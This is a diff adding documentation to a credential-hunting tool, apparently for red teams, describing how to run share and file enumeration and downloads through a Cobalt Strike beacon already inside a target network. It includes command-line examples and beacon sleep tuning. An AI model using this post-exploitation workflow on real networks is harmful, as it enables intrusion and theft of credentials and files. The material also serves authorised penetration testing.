@@ -253,6 +253,45 @@ credshrike agent --preset host --host filesrv01 ... \
 
 ---
 
+## Enumerating Through Cobalt Strike (cs-mcp transport)
+
+Instead of connecting to targets yourself, `--transport cs-mcp` routes the
+same read-only enumeration through a **Cobalt Strike beacon** via the
+official [cobaltstrike-mcp-server](https://github.com/Cobalt-Strike/cobaltstrike-mcp-server)
+(CS 4.13+, running on the teamserver host with its REST API enabled):
+
+```bash
+pip install "credshrike[mcp]"
+credshrike agent --preset host --host FILE01.hackaday.lab ...     --transport cs-mcp --cs-mcp-url http://teamserver:50051     --cs-beacon affinity
+```
+
+- **Why**: the beacon is already inside the network — isolated segments
+  and the beacon host itself (`--host localhost` enumerates the beacon's
+  own machine via its share→local-path map) become reachable with no SOCKS
+  pivot, and enumeration runs in the beacon's domain context.
+- **Batching beats beacon sleep**: directory walking submits a whole tree
+  level at once (`ls` receipts) and drains results as the beacon checks
+  in — a 60s-sleep beacon sweeps a level per check-in instead of a
+  directory. Never-completing executions surface as `CSUndelivered` at
+  the deadline (`cs_deadline_minutes`, default 30) so coverage accounting
+  sees every skipped path.
+- **Beacon choice** (`--cs-beacon`): an explicit id, `first` (default), or
+  `affinity` — a beacon whose hostname matches the target owns that host,
+  otherwise hosts round-robin across beacons for parallel check-ins.
+- **Sleep boost** (opt-in, `--cs-sleep-boost '5 50:60 50'`): submits
+  `sleep 5 50` when the run arms and `sleep 60 50` when it ends (every
+  beacon in use) — fast check-ins during collection, normal cadence after.
+- **Read-only carries over**: the transport only ever issues four
+  code-generated templates (`ls`, `net view`, `net share`, `download`);
+  command targets must pass a strict path charset, so a hostile filename
+  found in a listing can never become command syntax. Security/DACL
+  probes degrade to per-call errors (TransportUnsupported).
+- Reports are labelled `collected via Cobalt Strike (beacon N)` per host;
+  the banner shows the transport. Domain-computer queries still run from
+  the operator side (LDAP/ADWS) — hybrid by design.
+
+---
+
 ## Resume + Inventory Cache
 
 A killed sweep used to lose everything — host progress, per-share results,
